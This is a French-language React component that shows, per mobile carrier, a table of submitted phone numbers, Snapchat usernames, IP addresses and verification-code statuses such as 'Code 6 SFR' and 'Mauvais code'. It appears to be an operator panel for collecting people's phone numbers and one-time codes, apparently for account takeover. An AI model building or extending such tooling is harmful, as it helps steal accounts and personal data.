import { motion } from "framer-motion";
import { Phone } from "lucide-react";

const STATUS_LABELS = {
  pending: "En attente",
  code_ready: "Code prêt",
  code6_ready: "Code 6 prêt",
  code6sfr_ready: "Code 6 SFR",
  code6orange_ready: "Code 6 Orange",
  code_valid: "Validé",
  code_wrong: "Mauvais code",
  code_expired: "Expiré",
  waiting_queue: "En file",
};

const STATUS_COLORS = {
  pending: "bg-blue-500/20 text-blue-400",
  code_ready: "bg-amber-500/20 text-amber-400",
  code6_ready: "bg-amber-500/20 text-amber-400",
  code6sfr_ready: "bg-amber-500/20 text-amber-400",
  code6orange_ready: "bg-amber-500/20 text-amber-400",
  code_valid: "bg-emerald-500/20 text-emerald-400",
  code_wrong: "bg-red-500/20 text-red-400",
  code_expired: "bg-orange-500/20 text-orange-400",
  waiting_queue: "bg-purple-500/20 text-purple-400",
};

export default function OperatorSubmissions({ operator, submissions }) {
  return (
    <motion.div
      initial={{ opacity: 0, y: 16 }}
      animate={{ opacity: 1, y: 0 }}
      className="bg-card border border-border rounded-2xl overflow-hidden mb-8"
    >
      <div className="px-6 py-4 border-b border-border bg-muted/30 flex items-center gap-2">
        <Phone className="w-5 h-5 text-primary" />
        <h3 className="font-heading font-bold text-foreground">
          Numéros {operator} ({submissions.length})
        </h3>
      </div>
      <div className="overflow-x-auto max-h-[28rem] overflow-y-auto">
        <table className="w-full text-sm table-fixed min-w-[640px]">
          <colgroup>
            <col className="w-[15%]" />
            <col className="w-[20%]" />
            <col className="w-[15%]" />
            <col className="w-[12%]" />
            <col className="w-[20%]" />
            <col className="w-[18%]" />
          </colgroup>
          <thead>
            <tr className="border-b border-border bg-muted/50">
              <th className="text-left px-4 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">Téléphone</th>
              <th className="text-left px-4 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">Snapchat</th>
              <th className="text-left px-4 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">Statut</th>
              <th className="text-left px-4 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">Pays</th>
              <th className="text-left px-4 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">IP</th>
              <th className="text-left px-4 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">Date</th>
            </tr>
          </thead>
          <tbody>
            {submissions.length === 0 ? (
              <tr>
                <td colSpan={6} className="px-6 py-8 text-center text-muted-foreground text-sm">Aucun numéro pour cet opérateur</td>
              </tr>
            ) : (
              submissions.map((s) => (
                <tr key={s.id} className="border-b border-border/50 hover:bg-muted/30 transition-colors">
                  <td className="px-4 py-3 text-xs font-mono text-foreground whitespace-nowrap">{s.telephone || "—"}</td>
                  <td className="px-4 py-3 text-xs text-foreground/80 truncate max-w-0">{s.snapchat || "—"}</td>
                  <td className="px-4 py-3 text-xs">
                    <span className={`inline-block whitespace-nowrap px-2 py-1 rounded text-xs font-medium ${STATUS_COLORS[s.status] || "bg-primary/15 text-primary"}`}>
                      {STATUS_LABELS[s.status] || s.status}
                    </span>
                  </td>
                  <td className="px-4 py-3 text-xs text-foreground/70 whitespace-nowrap">{s.country || "—"}</td>
                  <td className="px-4 py-3 text-xs font-mono text-muted-foreground truncate max-w-0">{s.ip_address || "—"}</td>
                  <td className="px-4 py-3 text-xs text-muted-foreground whitespace-nowrap">
                    {s.created_date ? new Date(s.created_date).toLocaleString("fr-FR", { day: "2-digit", month: "2-digit", hour: "2-digit", minute: "2-digit" }) : "—"}
                  </td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>
    </motion.div>
  );
}